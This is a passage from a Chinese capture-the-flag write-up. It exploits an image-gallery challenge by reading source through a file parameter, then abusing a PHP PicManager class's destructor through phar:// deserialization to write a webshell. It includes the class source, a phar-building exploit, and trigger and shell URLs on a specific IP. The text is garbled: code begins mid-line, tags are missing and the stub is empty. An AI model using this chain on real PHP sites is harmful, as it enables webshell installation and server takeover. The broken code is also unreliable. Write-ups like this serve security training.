    }
    ?>
    GALLERY
    Gallery
        hello 
            pics();
    foreach ($pics as $file)
    {
            if($file=='.' || $file == '..') continue;
            $file_parts = explode('.',$file);
            $ext = strtolower(array_pop($file_parts));
    //      $title = implode('.',$file_parts);
    //      $title = htmlspecialchars($title);
            if(in_array($ext,$allowed_types))
            {
                    $left=rand(0,$stage_width);
                    $top=rand(0,400);
                    $rot = rand(-40,40);
                    if($top>$stage_height-130 && $left > $stage_width-230)
                    {
                            $top-=120+130;
                            $left-=230;
                    }
                    /* 输出各个图片: */
                    echo '
                    ';
            }
    }
    ?>
            文件：-->
可以看到实例化了一个PicManager对象，包含三个方法  
get参数通过pic参数传参，尝试之后发现可以读源码  
读取PicManager.php
    current_dir=$dir;
             if(!is_dir($dir))@mkdir($dir);
         }
         private function _log($message){
             array_push($this->actions,'['.date('y-m-d h:i:s',time()).']'.$message);
         }
         public function pics(){
             $this->_log('list pics');
             $pics=[];
             foreach(scandir($this->current_dir) as $item){
                 if(in_array(substr($item,-4),$this->whitelist))
                     array_push($pics,$this->current_dir."/".$item);
             }
             return $pics;
         }
         public function upload_pic(){
             $this->_log('upload pic');
             $file=$_FILES['file']['name'];
             if(!in_array(substr($file,-4),$this->whitelist)){
                 $this->_log('unsafe deal:upload filename '.$file);
                 return;
             }
             $newname=md5($file).substr($file,-4);
             move_uploaded_file($_FILES['file']['tmp_name'],$this->current_dir.'/'.$newname);
         }
         public function get_pic($picname){
             $this->_log('get pic');
             if(!file_exists($picname))
                 return '';
             $fi=new finfo(FILEINFO_MIME_TYPE);
             $mime=$fi->file($picname);
             header('Content-Type:'.$mime);
             return file_get_contents($picname);
         }
         public function clean(){
             $this->_log('clean');
             foreach(scandir($this->current_dir) as $file){
                 @unlink($this->current_dir."/".$file);
             }
         }
         public function __destruct(){
             $fp=fopen($this->current_dir.'/'.$this->logfile,"a");
             foreach($this->actions as $act){
                fwrite($fp,$act."\n");
             }
             fclose($fp);
         }
     }
    //$pic=new PicManager('./');
    //$pic->gen();
所以这里有一个反序列化的可控点，但是如何触发反序列化呢？  
所以这里就是phar协议拓展了攻击面  
利用phar协议对象注入来触发反序列化达到写shell的目的
    startBuffering();
    $phar->addFromString('te.txt','asd');
    $phar->setStub('');
    $o=new PicManager('/var/www/html/sandbox/4150952d11458a39692ea5d1e2756f1e');
    $phar->setMetaData($o);
    $phar->stopBuffering();
利用exp生成phar文件并上传，注意修改后缀为gif  
上传成功，然后通过phar协议触发反序列化
    http://49.4.68.67:86/?act=get&pic=phar:///var/www/html/sandbox/4150952d11458a39692ea5d1e2756f1e/f3035846cc279a1aff73b7c2c25367b9.gif
访问shell直接拿到flag  
`http://49.4.68.67:86/sandbox/4150952d11458a39692ea5d1e2756f1e/request.php`
## 参考链接